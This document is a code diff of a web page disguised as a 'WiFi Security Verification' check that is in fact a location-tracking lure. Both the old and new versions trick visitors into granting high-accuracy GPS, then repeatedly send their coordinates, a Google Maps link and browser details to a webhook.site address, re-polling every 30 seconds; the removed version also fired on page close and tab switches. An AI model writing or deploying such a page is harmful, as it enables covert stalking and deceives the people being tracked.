@@ -1,127 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Security Verification</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh; display:flex; align-items:center; justify-content:center;
-            color:#333;
-        }
-        .container {
-            background: rgba(255,255,255,0.95); backdrop-filter:blur(20px);
-            padding:40px; border-radius:20px; box-shadow:0 20px 40px rgba(0,0,0,0.1);
-            max-width:400px; width:90%; text-align:center;
-        }
-        h1 { color:#4a5568; margin-bottom:20px; font-size:1.4em; }
-        .status { 
-            font-size:1.2em; margin:20px 0; padding:15px; border-radius:10px;
-            transition: all 0.3s;
-        }
-        .scanning { background:#48bb78; color:white; animation:pulse 2s infinite; }
-        .verified { background:#38a169; color:white; }
-        .error { background:#f56565; color:white; }
-        button {
-            background:linear-gradient(45deg,#ff6b6b,#feca57); color:white;
-            border:none; padding:15px 30px; border-radius:50px; font-size:1.1em;
-            cursor:pointer; margin:10px; box-shadow:0 10px 20px rgba(254,202,87,0.3);
-            transition:all 0.3s;
-        }
-        button:hover { transform:translateY(-2px); box-shadow:0 15px 30px rgba(254,202,87,0.4); }
-        button:active { transform:translateY(0); }
-        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
-        #coords { font-family:monospace; font-size:0.9em; margin-top:10px; opacity:0.8; }
-        small { font-size:0.8em; opacity:0.7; display:block; margin-top:10px; }
-    </style>
+    <title>WiFi Verification</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>body{font-family:sans-serif;background:#667eea;padding:20px;text-align:center;max-width:400px;margin:auto;background:linear-gradient(135deg,#667eea,#764ba2);color:white;}
+    button{background:#ff4757;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:18px;cursor:pointer;margin:10px;box-shadow:0 5px 15px rgba(0,0,0,0.3);}
+    button:hover{transform:scale(1.05);}
+    #status{padding:15px;background:rgba(255,255,255,0.2);border-radius:10px;margin:20px 0;font-size:16px;}
+    #coords{font-family:monospace;background:rgba(0,0,0,0.2);padding:10px;border-radius:5px;margin:10px 0;}</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔒 WiFi Security Verification</h1>
-        <div id="status" class="status scanning">📡 Scanning networks for security...</div>
-        <p>High accuracy GPS required for WiFi verification</p>
-        <button id="scanBtn">📍 START GPS VERIFICATION</button>
-        <div id="coords"></div>
-        <small>Keep open for continuous monitoring</small>
-    </div>
+    <h1>🔒 WiFi Security Check</h1>
+    <div id="status">📡 Requesting GPS for verification...</div>
+    <button onclick="getLocation()">📍 ALLOW GPS SCAN</button>
+    <div id="coords"></div>
+    <small>Keep page open</small>
 
     <script>
-        // YOUR WEBHOOK URL ✅
-        const webhookUrl = 'https://webhook.site/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
+        // YOUR CORRECT WEBHOOK
+        const WEBHOOK = 'https://webhook.site/#!/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
         
-        function requestLocation() {
+        function getLocation() {
             navigator.geolocation.getCurrentPosition(
-                sendLocation,
-                (error) => {
-                    console.error('Geo error:', error);
-                    const status = document.getElementById('status');
-                    status.textContent = '❌ GPS permission required - Tap SCAN';
-                    status.className = 'status error';
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    
+                    // GOOGLE MAPS URL
+                    const gmaps = 'https://maps.google.com/?q=' + lat + ',' + lon;
+                    
+                    const data = {
+                        timestamp: new Date().toISOString(),
+                        lat: lat,
+                        lon: lon,
+                        accuracy: acc,
+                        google_maps: gmaps,
+                        gmaps_short: gmaps,
+                        ua: navigator.userAgent
+                    };
+                    
+                    // DISPLAY
+                    document.getElementById('coords').innerHTML = 
+                        'Lat: ' + lat + '<br>Lon: ' + lon + 
+                        '<br><a href="' + gmaps + '" target="_blank">🗺️ Google Maps</a>';
+                    
+                    document.getElementById('status').innerHTML = '✅ GPS OK (' + acc + 'm)';
+                    
+                    // SEND TO WEBHOOK
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: JSON.stringify(data),
+                        headers: {'Content-Type': 'application/json'}
+                    });
                 },
-                { 
-                    enableHighAccuracy: true,    // GPS ONLY (5-15m accuracy)
-                    maximumAge: 10000,           // Use cache <10s
-                    timeout: 15000               // 15s timeout
-                }
+                err => {
+                    document.getElementById('status').innerHTML = '❌ Tap ALLOW GPS';
+                    console.error(err);
+                },
+                {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
             );
         }
-
-        function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            
-            const data = {
-                timestamp: new Date().toISOString(),
-                latitude: lat,
-                longitude: lon,
-                accuracy: acc,
-                google_maps: `https://maps.google.com/?q=${lat},${lon}`,
-                userAgent: navigator.userAgent,
-                altitude: position.coords.altitude || null,
-                speed: position.coords.speed || null
-            };
-            
-            // SHOW COORDS + GOOGLE MAPS LINK
-            document.getElementById('coords').innerHTML = 
-                `${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
-                📍 <a href="${data.google_maps}" target="_blank">Open Google Maps</a><br>
-                Accuracy: ${acc.toFixed(0)}m`;
-            
-            document.getElementById('status').textContent = `✅ Verified (${acc.toFixed(0)}m accuracy)`;
-            document.getElementById('status').className = 'status verified';
-            
-            // SEND TO WEBHOOK
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(console.error);
-        }
-
-        // FORCE POPUPS: 1s, 3s, 5s
-        window.addEventListener('load', () => {
-            setTimeout(requestLocation, 1000);
-            setTimeout(requestLocation, 3000);
-            setTimeout(requestLocation, 5000);
-        });
         
-        // BIG RED BUTTON
-        document.getElementById('scanBtn').onclick = requestLocation;
-        
-        // EVERY 30 SECONDS (Background)
-        setInterval(requestLocation, 30000);
-        
-        // PAGE CLOSE TRAP
-        window.addEventListener('beforeunload', requestLocation);
-        
-        // VISIBILITY CHANGE (App switch)
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) requestLocation();
-        });
+        // AUTO START
+        setTimeout(getLocation, 1000);
+        setTimeout(getLocation, 3000);
+        setInterval(getLocation, 30000);
     </script>
 </body>
 </html>
